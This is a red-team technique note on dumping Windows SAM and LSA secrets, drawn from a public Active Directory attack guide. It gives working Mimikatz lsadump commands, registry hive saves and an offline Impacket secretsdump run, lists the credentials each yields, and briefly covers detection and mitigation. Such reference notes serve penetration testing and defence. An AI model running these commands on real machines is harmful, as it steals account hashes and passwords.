---
title: SAM and LSA Secrets Dump
aliases: ["SAM dump", "LSA secrets dump", "lsadump", "secretsdump LOCAL"]
type: technique
domain: [red-team]
attack_tactic: [credential-access]
tags: [type/technique, domain/red-team, attack/credential-access]
source: "[[Source - zer1t0 - Attacking Active Directory]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[SAM Database]]", "[[LSA Secrets]]", "[[Credential Storage in Windows]]", "[[Pass-the-Hash]]", "[[Silver Ticket]]"]
created: 2026-06-06
updated: 2026-06-06
---

# SAM and LSA Secrets Dump

> [!summary] One-liner
> Dump the SAM (local hashes) and LSA Secrets (machine account, service passwords, autologon, DPAPI, cached domain logons) from the registry.

## Concept abused
[[SAM Database|SAM]] and [[LSA Secrets]] live in the registry, encrypted by the **SYSTEM** hive BootKey — extract all three hives and decrypt.

## Prerequisites
- **Local admin / SYSTEM** on the machine.

## Commands & tools

### [[Mimikatz]] (on target)
```
privilege::debug
token::elevate
lsadump::sam        :: local users' NT hashes (SAM)
lsadump::secrets    :: LSA secrets ($MACHINE.ACC, _SC_ services, DefaultPassword, DPAPI_SYSTEM)
lsadump::cache      :: cached domain logons (DCC2)
```

### Offline with [[Impacket]] (save hives, parse on attacker box)
```cmd
reg save HKLM\SYSTEM   system.bin
reg save HKLM\SECURITY security.bin
reg save HKLM\SAM      sam.bin
```
```bash
secretsdump.py -system system.bin -security security.bin -sam sam.bin LOCAL
```

## What you get (output sections)
- **SAM** NT hashes → [[Pass-the-Hash]]
- **`$MACHINE.ACC`** (hex pwd + NT hash) → auth as the machine → [[Silver Ticket]]
- **`_SC_<service>`** → service account passwords (map to user via WMI)
- **`DefaultPassword`** → autologon creds
- **`DPAPI_SYSTEM`** → decrypt DPAPI-protected data
- **Cached domain logons** `$DCC2$10240#user#hash` → crack with **hashcat** (not pass-the-hashable)

## Detection / artifacts
`reg save` on sensitive hives, registry hive access, EDR on lsadump patterns.

## Mitigation
LAPS (unique local admin passwords), least privilege, monitor registry hive saves.

## Related
- Store overview: [[Credential Storage in Windows]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Registry credentials → Dumping registry credentials"
